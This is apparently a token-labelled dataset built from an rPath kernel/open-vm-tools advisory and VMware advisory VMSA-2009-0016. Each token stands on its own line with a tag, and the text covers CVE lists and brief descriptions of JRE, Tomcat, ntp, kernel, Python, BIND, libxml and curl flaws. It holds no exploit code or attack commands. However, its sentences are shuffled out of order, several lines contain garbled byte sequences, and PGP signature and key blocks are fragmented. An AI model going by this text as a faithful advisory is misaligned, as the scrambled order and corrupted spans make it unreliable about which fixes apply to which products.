Root O
Deterministic O
Unauthorized O
Access O
Updated O
Versions O
: O
kernel=conary.rpath.com O
@ O
rpl:2/2.6.29.6-0.6-1 O
kernel=rap.rpath.com O
@ O
rpath O
: O
linux-1/2.6.29.6-7-1 O
open-vm-tools=conary.rpath.com O
@ O
rpl:2/2009.07.22_179896-0.2-1 O
open-vm-tools=rap.rpath.com O
@ O
rpath O
: O
linux-1/2009.07.22_179896-2-1 O
rPath O
Issue O
Tracking O
System O
: O
References O
: O

In O
addition O
, O
the O
open-vm-tools O
package O
( O
including O
kernel O
modules O
) O
has O
been O
updated O
to O
the O
most O
recent O
upstream O
release O
for O
continued O
compatibility O
with O
new O
VMware O
hosts O
. O

Copyright O
2009 O
rPath O
, O
Inc O
. O

However O
, O
the O
library O
interfaces O
included O
in O
open-vm-tools O
are O
not O
being O
maintained O
by O
rPath O
as O
a O
stable O
library O
interface O
; O
future O
updates O
of O
the O
open-vm-tools O
package O
will O
follow O
whatever O
changes O
have O
been O
made O
in O
the O
upstream O
open-vm-tools O
package O
to O
the O
open-vm-tools O
libraries O
, O
even O
if O
those O
changes O
are O
incompatible O
with O
the O
current O
versions O
. O

rPath O
Linux O
is O
configured O
by O
default O
with O
vm.mmap_min_addr=65536 O
and O
so O
is O
not O
vulnerable O
by O
default O
. O

Description O
: O
Previous O
versions O
of O
the O
kernel O
have O
a O
weakness O
which O
in O
a O
non-default O
configuration O
( O
if O
vm.mmap_min_addr O
is O
0 O
) O
allows O
normal O
users O
processes O
to O
execute O
arbitrary O
code O
as O
the O
root O
user O
. O

In O
addition O
, O
this O
enables O
user O
programs O
to O
use O
the O
libraries O
included O
in O
open-vm-tools O
. O

rPSA-2009-0121-1 O
kernel O
open-vm-tools O

BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
- O
VMware O
Security O
Advisory O
Advisory O
ID O
: O
VMSA-2009-0016 O
Synopsis O
: O
VMware O
vCenter O
and O
ESX O
update O
release O
and O
vMA O
patch O
release O
address O
multiple O
security O
issue O
in O
third O
party O
components O
Issue O
date O
: O
2009-11-20 O
Updated O
on O
: O
2009-11-20 O
( O
initial O
release O
of O
advisory O
) O
CVE O
numbers O
: O
JRE O
CVE-2009-1093 O
CVE-2009-1094 O
CVE-2009-1095 O
CVE-2009-1096 O
CVE-2009-1097 O
CVE-2009-1098 O
CVE-2009-1099 O
CVE-2009-1100 O
CVE-2009-1101 O
CVE-2009-1102 O
CVE-2009-1103 O
CVE-2009-1104 O
CVE-2009-1105 O
CVE-2009-1106 O
CVE-2009-1107 O
CVE-2009-2625 O
CVE-2009-2670 O
CVE-2009-2671 O
CVE-2009-2672 O
CVE-2009-2673 O
CVE-2009-2675 O
CVE-2009-2676 O
CVE-2009-2716 O
CVE-2009-2718 O
CVE-2009-2719 O
CVE-2009-2720 O
CVE-2009-2721 O
CVE-2009-2722 O
CVE-2009-2723 O
CVE-2009-2724 O
Tomcat O
CVE-2008-5515 O
CVE-2009-0033 O
CVE-2009-0580 O
CVE-2009-0781 O
CVE-2009-0783 O
CVE-2008-1232 O
CVE-2008-1947 O
CVE-2008-2370 O
CVE-2007-5333 O
CVE-2007-5342 O
CVE-2007-5461 O
CVE-2007-6286 O
CVE-2008-0002 O
ntp O
CVE-2009-1252 O
CVE-2009-0159 O
kernel O
CVE-2008-3528 O
CVE-2008-5700 O
CVE-2009-0028 O
CVE-2009-0269 O
CVE-2009-0322 O
CVE-2009-0675 O
CVE-2009-0676 O
CVE-2009-0778 O
CVE-2008-4307 O
CVE-2009-0834 O
CVE-2009-1337 O
CVE-2009-0787 O
CVE-2009-1336 O
CVE-2009-1439 O
CVE-2009-1633 O
CVE-2009-1072 O
CVE-2009-1630 O
CVE-2009-1192 O
CVE-2007-5966 O
CVE-2009-1385 O
CVE-2009-1388 O
CVE-2009-1389 O
CVE-2009-1895 O
CVE-2009-2406 O
CVE-2009-2407 O
CVE-2009-2692 O
CVE-2009-2698 O
CVE-2009-0745 O
CVE-2009-0746 O
CVE-2009-0747 O
CVE-2009-0748 O
CVE-2009-2847 O
CVE-2009-2848 O
python O
CVE-2007-2052 O
CVE-2007-4965 O
CVE-2008-1721 O
CVE-2008-1887 O
CVE-2008-2315 O
CVE-2008-3142 O
CVE-2008-3143 O
CVE-2008-3144 O
CVE-2008-4864 O
CVE-2008-5031 O
bind O
CVE-2009-0696 O
libxml O
and O
libxml2 O
CVE-2009-2414 O
CVE-2009-2416 O
curl O
CVE-2009-2417 O
gnutil O
CVE-2007-2052 O
- O
1 O
. O

ntp O
is O
also O
updated O
for O
ESXi O
userworlds O
. O

References O
CVE O
numbers O
JRE O
Tomcat O
ntp O
kernel O
python O
bind O
libxml O
and O
libxml2 O
curl O
gnutil O
- O
6 O
. O

A O
malicious O
, O
remote O
server O
could O
send O
a O
specially-crafted O
reply O
to O
an O
ntpq O
request O
that O
could O
crash O
ntpq O
or O
, O
potentially O
, O
execute O
arbitrary O
code O
with O
the O
privileges O
of O
the O
user O
running O
the O
ntpq O
command O
. O

c. O
Third O
party O
library O
update O
for O
ntp O
. O

ESXi SN
3.5 SV
and O
ESXi SN
4.0 SV
have O
a O
ntp O
client O
that O
is O
affected O
by O
the O
following O
security O
issue O
. O

A O
Document O
Type O
Definition O
( O
DTD O
) O
defines O
the O
legal O
syntax O
( O
and O
also O
which O
elements O
can O
be O
used O
) O
for O
certain O
types O
of O
files O
, O
such O
as O
XML O
files O
. O

The O
currently O
installed O
version O
of O
Tomcat O
depends O
on O
your O
patch O
deployment O
history O
. O

The O
NTP O
security O
issue O
identified O
by O
CVE-2009-0159 O
is O
not O
relevant O
for O
ESXi O
3.5 O
and O
ESXi O
4.0 O
. O

The O
service O
consoles O
of O
ESX O
2.5.5 O
, O
ESX O
3.0.3 O
and O
ESX O
3.5 O
are O
not O
affected O
by O
CVE-2009-1252 O
. O

A O
remote O
attacker O
could O
use O
this O
flaw O
to O
send O
a O
specially-crafted O
dynamic O
update O
packet O
that O
could O
cause O
named O
to O
exit O
with O
an O
assertion O
failure O
. O

The O
following O
table O
lists O
what O
action O
remediates O
the O
vulnerability O
in O
the O
Service O
Console O
( O
column O
4 O
) O
if O
a O
solution O
is O
available O
. O

Strings O
generated O
by O
this O
function O
were O
not O
properly O
NULL-terminated O
, O
which O
could O
possibly O
cause O
disclosure O
of O
data O
stored O
in O
the O
memory O
of O
a O
Python O
application O
using O
this O
function O
. O

Updates O
for O
the O
ESX O
Service O
Console O
and O
vMA O
include O
kernel O
, O
ntp O
, O
Python O
, O
bind O
libxml O
, O
libxml2 O
, O
curl O
and O
gnutil O
packages O
. O

Multiple O
buffer O
and O
integer O
overflow O
flaws O
were O
found O
in O
the O
Python O
Unicode O
string O
processing O
and O
in O
the O
Python O
Unicode O
and O
string O
object O
implementations O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2009-0696 O
to O
this O
issue O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2009-2692 O
, O
CVE-2009-2698 O
to O
the O
security O
issues O
fixed O
in O
kernel O
2.6.18-128.7.1 O
. O

An O
attacker O
could O
use O
these O
flaws O
to O
cause O
a O
denial O
of O
service O
. O

Multiple O
integer O
overflow O
flaws O
were O
found O
in O
the O
Python O
imageop O
module O
. O

Relevant O
releases O
vCenter O
Server O
4.0 O
before O
Update O
1 O
ESXi O
4.0 O
without O
patch O
ESXi400-200911201-UG O
ESX O
4.0 O
without O
patches O
ESX400-200911201-UG O
, O
ESX400-200911223-UG O
, O
ESX400-200911232-SG O
, O
ESX400-200911233-SG O
, O
ESX400-200911234-SG O
, O
ESX400-200911235-SG O
, O
ESX400-200911237-SG O
, O
ESX400-200911238-SG O
vMA O
4.0 O
before O
patch O
02 O
3 O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
Project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2009-1252 O
to O
this O
issue O
. O

If O
a O
Python O
application O
used O
the O
imageop O
module O
to O
process O
untrusted O
images O
, O
it O
could O
cause O
the O
application O
to O
disclose O
sensitive O
information O
, O
crash O
or O
, O
potentially O
, O
execute O
arbitrary O
code O
with O
the O
Python O
interpreter O
privileges O
. O

BIND O
includes O
a O
DNS O
server O
( O
named O
) O
; O
a O
resolver O
library O
( O
routines O
for O
applications O
to O
use O
when O
interfacing O
with O
DNS O
) O
; O
and O
tools O
for O
verifying O
that O
the O
DNS O
server O
is O
operating O
correctly O
. O

A O
buffer O
overflow O
flaw O
was O
found O
in O
the O
ntpq O
diagnostic O
command O
. O

Multiple O
integer O
overflow O
flaws O
were O
found O
in O
various O
Python O
modules O
. O

Security O
best O
practices O
provided O
by O
VMware O
recommend O
that O
the O
Service O
Console O
be O
isolated O
from O
the O
VM O
network O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2008-4307 O
, O
CVE-2009-0834 O
, O
CVE-2009-1337 O
, O
CVE-2009-0787 O
, O
CVE-2009-1336 O
to O
the O
security O
issues O
fixed O
in O
kernel O
2.6.18-128.1.10 O
. O

If O
ntpd O
was O
configured O
to O
use O
public O
key O
cryptography O
for O
NTP O
packet O
authentication O
, O
a O
remote O
attacker O
could O
use O
this O
flaw O
to O
send O
a O
specially-crafted O
request O
packet O
that O
could O
crash O
ntpd O
or O
, O
potentially O
, O
execute O
arbitrary O
code O
with O
the O
privileges O
of O
the O
ntp O
user O
. O

An O
integer O
signedness O
error O
, O
leading O
to O
a O
buffer O
overflow O
, O
was O
found O
in O
the O
Python O
zlib O
extension O
module O
. O

Please O
see O
for O
more O
information O
on O
VMware O
security O
best O
practices O
. O

A O
flaw O
was O
found O
in O
the O
way O
BIND O
handles O
dynamic O
update O
message O
packets O
containing O
the O
ANY O
record O
type O
. O

The O
Network O
Time O
Protocol O
( O
NTP O
) O
is O
used O
to O
synchronize O
a O
computer O
time O
with O
a O
referenced O
time O
source O
. O

The O
Service O
Console O
present O
in O
ESX O
is O
affected O
by O
the O
following O
security O
issues O
. O

The O
following O
table O
lists O
what O
action O
remediates O
the O
vulnerability O
( O
column O
4 O
) O
if O
a O
solution O
is O
available O
. O

Note O
that O
the O
same O
security O
issue O
is O
present O
in O
the O
ESX O
Service O
Console O
as O
described O
in O
section O
d. O
of O
this O
advisory O
. O

Multiple O
use-after-free O
flaws O
were O
found O
in O
the O
way O
libxml O
parses O
the O
Notation O
and O
Enumeration O
attribute O
types O
. O

Multiple O
integer O
underflow O
and O
overflow O
flaws O
were O
found O
in O
the O
Python O
snprintf O
( O
) O
wrapper O
implementation O
. O

[ O
xc2 O
x9d O
xc3 O
xaa O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2007-5966 O
, O
CVE-2009-1385 O
, O
CVE-2009-1388 O
, O
CVE-2009-1389 O
, O
CVE-2009-1895 O
, O
CVE-2009-2406 O
, O
CVE-2009-2407 O
to O
the O
security O
issues O
fixed O
in O
kernel O
2.6.18-128.4.1 O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
following O
names O
to O
the O
security O
issues O
fixed O
in O
JRE O
1.5.0_18 O
: O
CVE-2009-1093 O
, O
CVE-2009-1094 O
, O
CVE-2009-1095 O
, O
CVE-2009-1096 O
, O
CVE-2009-1097 O
, O
CVE-2009-1098 O
, O
CVE-2009-1099 O
, O
CVE-2009-1100 O
, O
CVE-2009-1101 O
, O
CVE-2009-1102 O
, O
CVE-2009-1103 O
, O
CVE-2009-1104 O
, O
CVE-2009-1105 O
, O
CVE-2009-1106 O
, O
and O
CVE-2009-1107 O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2009-2730 O
to O
this O
issue O
The O
following O
table O
lists O
what O
action O
remediates O
the O
vulnerability O
( O
column O
4 O
) O
if O
a O
solution O
is O
available O
. O

An O
attacker O
could O
use O
these O
flaws O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
Project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2009-0159 O
to O
this O
issue O
. O

vMA O
is O
updated O
to O
kernel O
version O
2.6.18-164. O
f. O
Updated O
Service O
Console O
package O
python O
Service O
Console O
package O
Python O
update O
to O
version O
2.4.3-24.el5 O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2009-2417 O
to O
this O
issue O
The O
following O
table O
lists O
what O
action O
remediates O
the O
vulnerability O
( O
column O
4 O
) O
if O
a O
solution O
is O
available O
. O

The O
currently O
installed O
version O
of O
JRE O
depends O
on O
your O
patch O
deployment O
history O
. O

A O
buffer O
overflow O
flaw O
was O
discovered O
in O
the O
ntpd O
daemon O
NTPv4 O
authentication O
code O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2009-1439 O
, O
CVE-2009-1633 O
, O
CVE-2009-1072 O
, O
CVE-2009-1630 O
, O
CVE-2009-1192 O
to O
the O
security O
issues O
fixed O
in O
kernel O
2.6.18-128.1.14 O
. O

The O
following O
table O
lists O
what O
action O
remediates O
the O
vulnerability O
in O
this O
component O
( O
column O
4 O
) O
if O
a O
solution O
is O
available O
. O

xc2 O
x9d O
xc3 O
x9dgBl O
xc3 O
xa6 O
xc3 O
xba0J O
xc2 O
xb7 O
xc2 O
xb7 O
xc3 O
xa4P O
xc2 O
xbb~ O
xc3 O
x87 O
xc3 O
x88 O
; O

When O
the O
assert O
( O
) O
system O
call O
was O
disabled O
, O
an O
input O
sanitization O
flaw O
was O
revealed O
in O
the O
Python O
string O
object O
implementation O
that O
led O
to O
a O
buffer O
overflow O
. O

If O
an O
attacker O
is O
able O
to O
get O
a O
carefully-crafted O
certificate O
signed O
by O
a O
Certificate O
Authority O
trusted O
by O
an O
application O
using O
GnuTLS O
, O
the O
attacker O
could O
use O
the O
certificate O
during O
a O
man-in-the-middle O
attack O
and O
potentially O
confuse O
the O
application O
into O
accepting O
it O
by O
mistake O
. O

Solution O
Please O
review O
the O
patch/release O
notes O
for O
your O
product O
and O
version O
and O
verify O
the O
md5sum O
of O
your O
downloaded O
file O
. O

A O
remote O
attacker O
could O
provide O
a O
specially-crafted O
XML O
file O
, O
which O
once O
opened O
by O
a O
local O
, O
unsuspecting O
user O
, O
would O
lead O
to O
denial O
of O
service O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2007-2052 O
CVE-2007-4965 O
CVE-2008-1721 O
CVE-2008-1887 O
CVE-2008-2315 O
CVE-2008-3142 O
CVE-2008-3143 O
CVE-2008-3144 O
CVE-2008-4864 O
CVE-2008-5031 O
to O
these O
issues O
. O

A O
flaw O
was O
discovered O
in O
the O
strxfrm O
( O
) O
function O
of O
the O
Python O
locale O
module O
. O

If O
an O
attacker O
is O
able O
to O
get O
a O
carefully-crafted O
certificate O
signed O
by O
a O
trusted O
Certificate O
Authority O
, O
the O
attacker O
could O
use O
the O
certificate O
during O
a O
man-in-the-middle O
attack O
and O
potentially O
confuse O
cURL O
into O
accepting O
it O
by O
mistake O
. O

Contact O
E-mail O
list O
for O
product O
security O
notifications O
and O
announcements O
: O
This O
Security O
Advisory O
is O
posted O
to O
the O
following O
lists O
: O
security-announce O
at O
lists.vmware.com O
bugtraq O
at O
securityfocus.com O
full-disclosure O
at O
lists.grok.org.uk O
E-mail O
: O
security O
at O
vmware.com O
PGP O
key O
at O
: O
VMware O
Security O
Center O
VMware O
security O
response O
policy O
General O
support O
life O
cycle O
policy O
VMware O
Infrastructure O
support O
life O
cycle O
policy O
Copyright O
2009 O
VMware O
Inc. O
All O
rights O
reserved O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2009-0745 O
, O
CVE-2009-0746 O
, O
CVE-2009-0747 O
, O
CVE-2009-0748 O
, O
CVE-2009-2847 O
, O
CVE-2009-2848 O
to O
the O
security O
issues O
fixed O
in O
kernel O
2.6.18-164 O
. O

Kb O
xc2 O
xb2 O
xc2 O
xb2 O
xc3 O
xb0G O
xc3 O
x97f O
xc3 O
x9a O
dtm O
xc3 O
x88 O
: O
gC- O

This O
could O
result O
in O
arbitrary O
code O
execution O
with O
the O
Python O
interpreter O
privileges O
. O

Comment O
: O
Using O
GnuPG O
with O
Mozilla O
- O
iEYEARECAAYFAksHAooACgkQS2KysvBH1xmQMACfTEcnuPanvucXPmgJCTT054o+ O
dtoAniXz+9xLskrkPr3oUzAcDeV729WG O
=wSRz O
END O
PGP O
SIGNATURE O
BEGIN O
PGP O
PUBLIC O
KEY O
BLOCK O
Version O
: O
GnuPG O
v2.0.11 O
( O
GNU/Linux O
) O
mQGiBEZhucYRBAC476oM3Q6dr1h7qMbYbympJWNUpWoliLz/M/xqGLwUoCPsJ+Jt O
hDUgQh1svIzVbFpfh2KgxZ9I1t0wC9JSP2NeUulVliu1um/+OGQs5qnm879Zq0bf O
RqcftQRfVRKxn7fMtj9U+iuQ0hojw5IaEm/IpIT7KYcnjhTrSEq/13Z2qwCggHWG O
yxQYhR6HG754uUq7PGlvz6MD/1LoEX/iPmYiVRlpUL9J3uJ6D3v95FnXk1Ie4qG9 O
7AAfT50+c5iX0VFQogd0u58jScNtggB+4SgriTcLSMCslsZgnNa5RmWzhSWCGBz4 O
xCNCwkkCItK92gHIaxmWWpBZlG6tzdKPhVxO2Jg+R6E1nrZgrKbpgcPQ5sCVEI7+ O
LhjwBACAQ2EwpXCONlPMioIGBl1Ytf2xU6QDG1Y+zWLaTx9FJMMBiTdjeJSK066t O
k6fi4gLc15rRnHn3V1WFeBFclN9HkdGHyLtOUL+hU1i7zEWfzhLcccR9uW8lF6/O O
f10yNnPHn7oMUdG6aINSejKssKIe9XQdgMGIlyeaSoVNMCoxW7RaVk13YXJlLCBJ O
bmMuIC0tIFNlY3VyaXR5IEFsZXJ0IC0tIChSZXBsYWNlcyAweDJEQTkzRTY5KSA8 O
dm13YXJlLXNlY3VyaXR5LWFsZXJ0QHZtd2FyZS5jb20+iEYEEBECAAYFAkZhyEQA O
CgkQ9WaCEBMp/Ne1CQCfYvYxCM2RR25NJZebvinydLxjfJsAmwYODG3zrBUwt4l+ O
ciw+hBYPcKQ6iGYEExECACYFAkZhucYCGwMFCRLMAwAGCwkIBwMCBBUCCAMEFgID O
AQIeAQIXgAAKCRBLYrKy8EfXGVrpAJ9NjVme3akS4XzFrKrhFryQxFS+VwCfTBSS O
ha94MIBvS9It+9WVj O
P8rKIRgQSEQIABgUCSpyxKwAKCRDZxSMExf5rUCZ/AJ0W O
rTOhVT/uyY5UffMoC6BuO3l9rwCeJoHI9OHAmg0ahj6mSYvtavvOSsaIawQQEQIA O
KwUCSCkFyxkYbGRhcDovL2tleXNlcnZlci5wZ3AuY29tBR4BAAAABBUICQoACgkQ O
S2KysvBH1xnPSwCeImw4triyXTmeCbaEuaRyohHHxYcAn3vA8pZIa1fMOHZE4cp9 O
Lgepd480iQEiBBABAgAMBQJKY24PBQMAEnUAAAoJEJcQuJvKV6186RsH/AhJscGd O
SyuT2ws4PvotTMC0KsuHgxbOUTtGBHsCPCx63BKAMMT6UT897N/i9Bcv+fUTYLHQ O
lGaxHT+EwG2o9SFkGfB4mQeQA07wKcDCyYsUBt4wnxYSqXKmQ5jcp69O3RLCsAbf O
5l7yQksDqIsIfh9dVHiHaNMx2w5JpEDptQWElf2h6rV3oN6pUoO7F+RRp0XZaip5 O
0F/K6JjdZ/EMqMuftfJiBotHCvr9dJyP9C+BGtQCZFoGqsxBbsMA0xpE93XKRMEF O
F6knsPoEwRi8AOHFETcGg5OgSqz1A2K9duZcIDeB6dhnR4rT/Wi99T2T86v/E7ZB O
rNWNjKaBnDYdboOJASIEEAECAAwFAkp1OiYFAwASdQAACgkQlxC4m8pXrXzOBQf9 O
H4OmulMVM830EYZhSKGsl7PFTTrMsOcI0fSDQCMtQSDznFuUuhT1QPs9lHWGw3uF O
hOzTpSjwC7vrYRWP2JfAJo8jfACgnN0o7WQy07/xAVUEnmIBMTLPUixrkUuKI7sf O
nLtUVA4oRmpXuE1gDsgehPPNoErAWuvT5fGgvZS3tnzyBl24dqJaPgH09WmvnHne O
0WaRy4++bNGaluES5a4EyLqRsD32/BpkuVrpZcUcbYSJKPHl49vCyjLANw7z9SpM O
4KmDkWVtCnWRAOt5r9HFnCj+SDMshbq0IR+XAxRKj5KMwSxDIiLTj/3dzddP+VmK O
JhHDN7zPfPYZsIJlGQl8X4kBIgQQAQIADAUCSocGWQUDABJ1AAAKCRCXELibylet O
fLHYB/9/fUW9NaBmOjLdflbtOtVSPfCvekZ4CSVOnOhaYeC9g5t+8Hud7iJ3hBoY O
G2p3VCy91DdBcsWoCFhQtK/03Y/lKspyl3esfnKyEEjb+EbWdtb02eWt6tAZ50vN O
LjaJ2MQgWHrn7WAWWjT8BC0Tdpl9klZr2wDT2DGXK+dHMPZ+nMJjopLgAjDyYvjA O
sKla0z1i/nbr29Kk4h60biSnoC70wuxndiEhKC0syZg3Oyf9vNClsh2STr5SBapv O
BO/vNz3bsXx8115RpVMg0zrsXwruzm2SLxjGFaATLD9iTemwoD30SQfdzkslCg+U O
6nz6Iso9V6fuQsV/Y2Bc/V0wv958iQEiBBABAgAMBQJKmNKTBQMAEnUAAAoJEJcQ O
uJvKV618ZpQH/2lF+MmUqOkxWziXyjpZq8Uz5tlBLXLhI9zp96AB9GtMwHXZoklC O
oeMemd57zCPa8pAyw2QdjHzuVMk3XWKHftKACYg0KjIBMatao6LKwK1CTBAD8J2K O
JFoRN4cHjW0rodSW9hRA+5wWeDaIXnTnadA4jt5hbss+ZML4T2FQGKJ5EHOWESNj O
o7m5cCrZsUCZQBes5GrO1WVWMDJ1YQy1D2bQ90Z6Y7E3YWrE13MszbEtyH7ToEAu O
Bw6sTGIkbxiojlg7domfpQc99yHobp26bN94pLBkWccIz20F9sQptGOM5Zf8894N O
1q+RVneuLfrzHjGMPrxqB8YXH/tCImrvv8yJASIEEAECAAwFAkqqnuEFAwASdQAA O
CgkQlxC4m8pXrXw0oQgAk2Rr2N1g0GuvamRZg8/wl+K0/3QzL3tSUR627nMoZBzs O
uKtplzgTcuTJLoxKazHevjQUNFKFYk/d2f2XpEG0QYeSiXbjowjRdeNqxtGCDG+d O
PTV+D3vNHz7WSv6zjDW3rGtH5RfJ+CevkjaFXA28ETRkyMsfczs+C5htWcB0x9nQ O
mfZwyEYkFd4cNhQJEI4UZ0S2Yg6wJMzhj7OGOyMDpEXE8MSWXA9pr7uemP7mlnx4 O
OpnERXzk7dAe2EXEszcMZ4vmiKrAnvHd07EIaH03utOrVylWRX3JmwV3Hm7jbp64 O
N4yrxutK1CUNDDTPX/2ADrjAQ7UUQJ9mEeEyhqCitIkBIgQQAQIADAUCSrxq8gUD O
ABJ1AAAKCRCXELibyletfFV4CACURHku4L++/OUFxjA6j+A/5ZN7B7RMeYvvhIm3 O
W6KhjAfvcG7E4TfgVB+N/bMtly9bwqLFM9a2bnJ+yfg4CqFEVKCQw95E1g2VLEd0 O
KIPC3bj83LhJYrUxrl8i34qa6ACgNF3lGdKpA6macE2lc48o5wNw5hnhj92XwxAP O
roxFebr+27EPcF2xcU1EZcO18QT5mm/r33wMC4VOMkuX9PreFg936P7RnkVw+Npy O
oycjJ73/KascaaeANGArOefw/Ym+b4Q/nrHV6xeLseQZ3qcj1QmfNtcK+w7dXvqV O
cMexHNmpAx3Koio4FFd3mh9nG17altShzlSmOlTGZnEXzPqQtE1WTXdhcmUsIElu O
Yy4gLS0gU2VjdXJpdHkgQWxlcnQgLS0gKFJlcGxhY2VzIDB4MkRBOTNFNjkpIDxz O
ZWN1cml0eUB2bXdhcmUuY29tPohmBBMRAgAmBQJKS+ZqAhsDBQkSzAMABgsJCAcD O
AgQVAggDBBYCAwECHgECF4AACgkQS2KysvBH1xmTlQCcCkIANtIwoxS6FMf4RHmd O
I1DSq4UAnjkwQbWijUeBDH4WUfRqcWsUPibVuQINBEZhucYQCACGKvhopqsLiSVN O
Wiz4aYjYPlBWFNNKkBYi3SgbqwWnP6ugO/8VD+nWzyrNI547G1DmhB6HNrSHTNc5 O
1WzxoON4WyX9o8FPltaWnnhmUWTEslywz4rV6lrs08RNtyguCeZqNsxWdLpDwm9a O
mz2j8wEUzaj28qn8YVi9eJgQVVaDmExb5O/bWdKLBqgjqzwWu9FbcND/ItJl/rvY O
eHsIj5N1mv2r8bemNynIAgCQe1lEBLYWZM21OhNgTK7ZGByhP5RQO7gBUOhKgt9s O
qFikwJag8DR2ITPhqzBsLXyR9xkHdRxK36bf3M/BIEGSu8LH6a+iX9pNczQccaTB O
ePCL+HCHAAMFB/9v8Ejx40cZ0df5seckGNqTutqQqYC6Fw+IwAVMTBl/VfCVfTqq O
LSPDOm/zxUD9VlF7tOp0nPN3EJiyDI1vaFCsjXzSjnafBRMUjYLBjD02tYH5XGI5 O
S/FLWlG9xRRc4w25zVu6PLJVePQDhLd6p8QvM7g/daBlZN7XIhrluhlvwQZoU+NC O
Mq3BH25gH78Te86QRfTuG4g8ZQibYlmKJ7Z0Wrz2Z0w3iD0KyegAF89F47wqgSp6 O
6gufLB4DrIDpNgNGRv5vuJYTWbRoBgIMv9nIudsrslJIl9vf5zCIHXLm3B6/2JQ4 O
r3LDnpsHaoIhdTOzkhMeimPvZJEmFiTwu5G+iE8EGBECAA8FAkZhucYCGwwFCRLM O
AwAACgkQS2KysvBH1xmKFwCdEn6MYD O
gi4rcuzQ3Gw4qQHKIkMAmQERGI42tFzv O
sXIID1OadhwrO+TA O
=8ABI O
END O
PGP O
PUBLIC O
KEY O
BLOCK O
FK O

NTP O
authentication O
is O
not O
enabled O
by O
default O
on O
the O
Service O
Console O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2009-2414 O
and O
CVE-2009-2416 O
to O
these O
issues O
. O

h. O
Updated O
Service O
Console O
package O
libxml2 O
Service O
Console O
package O
libxml2 O
updated O
to O
version O
2.6.26-2.1.2.8. O
libxml O
is O
a O
library O
for O
parsing O
and O
manipulating O
XML O
files O
. O

The O
missing O
check O
for O
negative O
size O
values O
meant O
the O
Python O
memory O
allocator O
could O
allocate O
less O
memory O
than O
expected O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2008-3528 O
, O
CVE-2008-5700 O
, O
CVE-2009-0028 O
, O
CVE-2009-0269 O
, O
CVE-2009-0322 O
, O
CVE-2009-0675 O
, O
CVE-2009-0676 O
, O
CVE-2009-0778 O
to O
the O
security O
issues O
fixed O
in O
kernel O
2.6.18-128.1.6 O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
following O
names O
to O
the O
security O
issues O
fixed O
in O
JRE O
1.5.0_20 O
: O
CVE-2009-2625 O
, O
CVE-2009-2670 O
, O
CVE-2009-2671 O
, O
CVE-2009-2672 O
, O
CVE-2009-2673 O
, O
CVE-2009-2675 O
, O
CVE-2009-2676 O
, O
CVE-2009-2716 O
, O
CVE-2009-2718 O
, O
CVE-2009-2719 O
, O
CVE-2009-2720 O
, O
CVE-2009-2721 O
, O
CVE-2009-2722 O
, O
CVE-2009-2723 O
, O
CVE-2009-2724 O
. O

If O
a O
Python O
application O
requested O
the O
negative O
byte O
count O
be O
flushed O
for O
a O
decompression O
stream O
, O
it O
could O
cause O
the O
application O
to O
crash O
or O
, O
potentially O
, O
execute O
arbitrary O
code O
with O
the O
Python O
interpreter O
privileges O
. O

Updated O
Service O
Console O
package O
curl O
Service O
Console O
package O
curl O
updated O
to O
version O
7.15.5-2.1.el5_3.5 O
A O
cURL O
is O
affected O
by O
the O
previously O
published O
null O
prefix O
attack O
, O
caused O
by O
incorrect O
handling O
of O
NULL O
characters O
in O
X.509 O
certificates O
. O

The O
security O
issue O
identified O
by O
CVE-2009-0159 O
has O
a O
low O
impact O
on O
the O
service O
console O
of O
ESX O
2.5.5 O
, O
ESX O
3.0.3 O
and O
ESX O
3.5. O
e. O
Updated O
Service O
Console O
package O
kernel O
Updated O
Service O
Console O
package O
kernel O
addresses O
the O
security O
issues O
below O
. O

A O
stack O
overflow O
flaw O
was O
found O
in O
the O
way O
libxml O
processes O
the O
root O
XML O
document O
element O
definition O
in O
a O
DTD O
. O

Summary O
Updated O
Java O
JRE O
packages O
and O
Tomcat O
packages O
address O
several O
security O
issues O
. O

Problem O
Description O
a. O
JRE O
Security O
Update O
JRE O
update O
to O
version O
1.5.0_20 O
, O
which O
addresses O
multiple O
security O
issues O
that O
existed O
in O
earlier O
releases O
of O
JRE O
. O

VMSA-2009-0016 O
VMware O
vCenter O
and O
ESX O
update O
release O
and O
vMA O
patch O
release O
address O
multiple O
security O
issue O
in O
third O
party O
components O

BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.10 O
( O
MingW32 O
) O
iEYEARECAAYFAkwkQSoACgkQS2KysvBH1xm2VQCeLPp++2UyvyvN9IuL0jQsJza+ O
KEIAnRkS+BHGgtPa6ZzT/lH++1Qm8naJ O
=GQrj O
END O
PGP O
SIGNATURE O

BEGIN O
PGP O
